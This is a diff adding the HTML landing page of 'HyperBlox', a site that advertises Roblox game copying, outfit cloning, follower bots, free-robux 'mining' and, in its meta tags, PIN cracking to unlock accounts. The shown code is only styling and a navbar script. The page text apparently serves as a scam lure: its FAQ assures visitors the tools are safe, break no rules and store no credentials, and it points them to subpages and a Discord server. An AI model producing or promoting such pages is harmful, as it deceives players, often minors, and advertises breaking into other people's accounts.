@@ -1,0 +1,515 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="author" content="HyperBlox">
+    <meta name="description" content="HyperBlox - The best Roblox tools for game copying, clothing duplication, bot followers, and PIN cracking, all free and secure.">
+    <meta name="keywords" content="Roblox, HyperBlox, game copier, clothing copier, bot followers, PIN cracker, safe Roblox tools, automation">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="HyperBlox - The Best Roblox Tools">
+    <meta property="og:description" content="Copy games, duplicate clothes, gain followers, and unlock Roblox accounts with HyperBlox's powerful and safe tools.">
+    <meta property="og:image" content="https://undetectedgoons.lol/files/hyperblox.png">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://hyperblox.eu/">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Rbxtools - The Best Roblox Tools">
+    <meta name="twitter:site" content="https://hyperblox.eu/">
+    <meta name="twitter:description" content="Copy games, duplicate clothes, gain followers, and unlock Roblox accounts with HyperBlox's powerful and safe tools.">
+    <meta name="twitter:image" content="https://undetectedgoons.lol/files/hyperblox.png">
+    <meta name="theme-color" content="#000000">
+    <meta name="msapplication-TileColor" content="#000000">
+    <meta itemprop="name" content="HyperBlox">
+    <meta itemprop="description" content="HyperBlox - Advanced Roblox tools for copying games, cloning outfits, and more.">
+    <title>HyperBlox</title>
+    <link rel="icon" type="image/png" href="https://undetectedgoons.lol/files/hyperblox.png">
+    <link rel="shortcut icon" href="https://undetectedgoons.lol/files/hyperblox.ico">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: 'Poppins', sans-serif;
+            background: #0a0a0a;
+            color: #ffffff;
+            scroll-behavior: smooth;
+            overflow-x: hidden;
+        }
+
+        #navbar {
+            background: rgba(10, 10, 10, 0.9);
+            backdrop-filter: blur(10px);
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 1000;
+            transition: all 0.3s ease;
+        }
+
+        #navbar.active {
+            background: rgba(10, 10, 10, 0.95);
+        }
+
+        .navbar-brand {
+            display: flex;
+            align-items: center;
+        }
+
+        .navbar-brand img {
+            width: 3.5rem;
+        }
+
+        .logo-text {
+            font-family: 'Poppins', sans-serif;
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-left: 0.5rem;
+            background: linear-gradient(135deg, #6a11cb, #2575fc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            animation: glow 2s infinite alternate;
+        }
+
+        @keyframes glow {
+            0% {
+                text-shadow: 0 0 5px rgba(106, 17, 203, 0.7), 0 0 10px rgba(106, 17, 203, 0.7);
+            }
+            100% {
+                text-shadow: 0 0 10px rgba(106, 17, 203, 0.9), 0 0 20px rgba(106, 17, 203, 0.9);
+            }
+        }
+
+        .navbar-nav .nav-link {
+            color: #ffffff;
+            font-weight: 500;
+            margin: 0 1rem;
+            transition: color 0.3s ease;
+        }
+
+        .navbar-nav .nav-link:hover {
+            color: #6a11cb;
+        }
+
+        #landing {
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            background: linear-gradient(135deg, #1a1a1a, #000000);
+            position: relative;
+            overflow: hidden;
+        }
+
+        #landing h1 {
+            font-size: 4rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            z-index: 2;
+        }
+
+        #landing h1 span {
+            color: #6a11cb;
+        }
+
+        #landing p {
+            font-size: 1.2rem;
+            color: #a0a0a0;
+            max-width: 600px;
+            margin: 0 auto 2rem;
+            z-index: 2;
+        }
+
+        #landing .button {
+            background: linear-gradient(135deg, #6a11cb, #2575fc);
+            border: none;
+            border-radius: 10px;
+            color: #ffffff;
+            padding: 0.75rem 1.5rem;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            z-index: 2;
+        }
+
+        #landing .button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(106, 17, 203, 0.4);
+        }
+
+        #landing .preview-image {
+            position: absolute;
+            left: -12%;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 60%;
+            max-width: 600px;
+            z-index: 1;
+            animation: float 6s infinite ease-in-out;
+            filter: drop-shadow(0 0 20px rgba(106, 17, 203, 0.8));
+        }
+
+        @keyframes float {
+            0%, 100% {
+                transform: translateY(-50%) translateX(0);
+            }
+            50% {
+                transform: translateY(-50%) translateX(10px);
+            }
+        }
+
+        #tools {
+            padding: 4rem 0;
+            background: #121212;
+            position: relative;
+            z-index: 2;
+        }
+
+        #tools h2 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        #tools h2 span {
+            color: #6a11cb;
+        }
+
+        #tools .box {
+            background: rgba(20, 20, 20, 0.8);
+            border-radius: 15px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        #tools .box:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        #tools .box h3 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            margin-bottom: 1rem;
+        }
+
+        #tools .box p {
+            color: #a0a0a0;
+            margin-bottom: 1.5rem;
+        }
+
+        #tools .box .info-line {
+            display: flex;
+            align-items: center;
+            margin-bottom: 0.75rem;
+            color: #a0a0a0;
+        }
+
+        #tools .box .info-line i {
+            margin-right: 0.5rem;
+            color: #6a11cb;
+        }
+
+        #tools .box .button {
+            background: linear-gradient(135deg, #6a11cb, #2575fc);
+            border: none;
+            border-radius: 10px;
+            color: #ffffff;
+            padding: 0.75rem 1.5rem;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 1rem;
+        }
+
+        #tools .box .button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(106, 17, 203, 0.4);
+        }
+
+        #faq {
+            padding: 4rem 0;
+            background: #0a0a0a;
+            position: relative;
+            z-index: 2;
+        }
+
+        #faq h2 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        #faq h2 span {
+            color: #6a11cb;
+        }
+
+        #faq .accordion-item {
+            background: rgba(20, 20, 20, 0.8);
+            border: none;
+            border-radius: 10px;
+            margin-bottom: 1rem;
+        }
+
+        #faq .accordion-button {
+            background: transparent;
+            color: #ffffff;
+            font-weight: 600;
+        }
+
+        #faq .accordion-button:focus {
+            box-shadow: none;
+        }
+
+        #faq .accordion-body {
+            color: #a0a0a0;
+        }
+
+        #contact {
+            padding: 4rem 0;
+            background: #121212;
+            text-align: center;
+            position: relative;
+            z-index: 2;
+        }
+
+        #contact h2 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+        }
+
+        #contact p {
+            font-size: 1.2rem;
+            color: #a0a0a0;
+            margin-bottom: 2rem;
+        }
+
+        #contact .button {
+            background: linear-gradient(135deg, #6a11cb, #2575fc);
+            border: none;
+            border-radius: 10px;
+            color: #ffffff;
+            padding: 0.75rem 1.5rem;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 0 0.5rem;
+        }
+
+        #contact .button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(106, 17, 203, 0.4);
+        }
+
+        footer {
+            background: rgba(10, 10, 10, 0.9);
+            padding: 1rem 0;
+            text-align: center;
+            position: relative;
+            z-index: 2;
+        }
+
+        footer p {
+            color: #a0a0a0;
+            margin: 0;
+        }
+    </style>
+</head>
+<body>
+    <header id="navbar" class="active">
+        <nav class="navbar navbar-expand-lg navbar-dark">
+            <div class="container">
+                <a class="navbar-brand" href="#">
+                    <img src="https://undetectedgoons.lol/files/hyperblox.png" alt="HyperBlox Logo">
+                    <span class="logo-text">HyperBlox</span>
+                </a>
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarNav">
+                    <ul class="navbar-nav ms-auto">
+                        <li class="nav-item">
+                            <a class="nav-link" href="#landing">Home</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#tools">Tools</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#faq">FAQ</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#contact">Contact</a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <section id="landing">
+        <div class="container">
+            <div class="row">
+                <div class="col-12 text-center">
+                    <h1>Welcome to <span>HyperBlox</span></h1>
+                    <p>Unlock the full potential of Roblox with our powerful tools. Copy games, duplicate clothes, and gain followers with ease!</p>
+                    <a href="#tools" class="button">Get Started</a>
+                </div>
+            </div>
+            <img src="https://undetectedgoons.lol/files/ai.png" alt="Roblox GFX" class="preview-image">
+        </div>
+    </section>
+
+    <section id="tools">
+        <div class="container">
+            <h2>Our <span>Tools</span></h2>
+            <div class="row">
+                <div class="col-md-4">
+                    <div class="box">
+                        <h3>Game Copier</h3>
+                        <p>Copy any Roblox game with ease using our advanced tools.</p>
+                        <div class="info-line">
+                            <i class="fas fa-check-circle"></i> 24/7 Working
+                        </div>
+                        <div class="info-line">
+                            <i class="fas fa-bolt"></i> Very Fast
+                        </div>
+                        <div class="info-line">
+                            <i class="fas fa-shield-alt"></i> Safe & Secure
+                        </div>
+                        <a href="#" class="button">Try Now</a>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="box">
+                        <h3>Roblox Miner</h3>
+                        <p>Mining free robux.</p>
+                        <div class="info-line">
+                            <i class="fas fa-check-circle"></i> 24/7 Working
+                        </div>
+                        <div class="info-line">
+                            <i class="fas fa-bolt"></i> Very Fast
+                        </div>
+                        <div class="info-line">
+                            <i class="fas fa-shield-alt"></i> Safe & Secure
+                        </div>
+                        <a href="robux.html" class="button">Try Now</a>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="box">
+                        <h3>Follower Bot</h3>
+                        <p>Gain thousands of followers on Roblox with our botting tools.</p>
+                        <div class="info-line">
+                            <i class="fas fa-check-circle"></i> 24/7 Working
+                        </div>
+                        <div class="info-line">
+                            <i class="fas fa-bolt"></i> Very Fast
+                        </div>
+                        <div class="info-line">
+                            <i class="fas fa-shield-alt"></i> Safe & Secure
+                        </div>
+                        <a href="follow.html" class="button">Try Now</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="faq">
+        <div class="container">
+            <h2>Frequently Asked <span>Questions</span></h2>
+            <div class="accordion" id="faqAccordion">
+                <div class="accordion-item">
+                    <h2 class="accordion-header" id="headingOne">
+                        <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapseOne" aria-expanded="true" aria-controls="collapseOne">
+                            Is this safe?
+                        </button>
+                    </h2>
+                    <div id="collapseOne" class="accordion-collapse collapse show" aria-labelledby="headingOne" data-bs-parent="#faqAccordion">
+                        <div class="accordion-body">
+                            ✅ Yes, we use secure encryption & private logs to keep your data protected.
+                        </div>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <h2 class="accordion-header" id="headingTwo">
+                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo">
+                            Does this violate any Roblox rules?
+                        </button>
+                    </h2>
+                    <div id="collapseTwo" class="accordion-collapse collapse" aria-labelledby="headingTwo" data-bs-parent="#faqAccordion">
+                        <div class="accordion-body">
+                            ✅ No, this method is entirely within safe usage, and we do not store credentials.
+                        </div>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <h2 class="accordion-header" id="headingThree">
+                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseThree" aria-expanded="false" aria-controls="collapseThree">
+                            How long does it take?
+                        </button>
+                    </h2>
+                    <div id="collapseThree" class="accordion-collapse collapse" aria-labelledby="headingThree" data-bs-parent="#faqAccordion">
+                        <div class="accordion-body">
+                            ✅ The process usually completes within seconds, depending on the request load.
+                        </div>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <h2 class="accordion-header" id="headingFour">
+                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseFour" aria-expanded="false" aria-controls="collapseFour">
+                            Do I need special software?
+                        </button>
+                    </h2>
+                    <div id="collapseFour" class="accordion-collapse collapse" aria-labelledby="headingFour" data-bs-parent="#faqAccordion">
+                        <div class="accordion-body">
+                            ✅ No, this works entirely within your browser with no extra downloads.
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="contact">
+        <div class="container">
+            <h2>Contact <span>Us</span></h2>
+            <p>Have questions? Reach out to us via Discord or our online support.</p>
+            <a href="https://discord.gg/HfhVX8TrnT" class="button">Discord</a>
+            <a href="#" class="button">Online Support</a>
+        </div>
+    </section>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 rbxtools. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        window.addEventListener('scroll', () => {
+            const navbar = document.getElementById('navbar');
+            if (window.scrollY > 50) {
+                navbar.classList.add('active');
+            } else {
+                navbar.classList.remove('active');
+            }
+        });
+    </script>
+</body>
+</html>
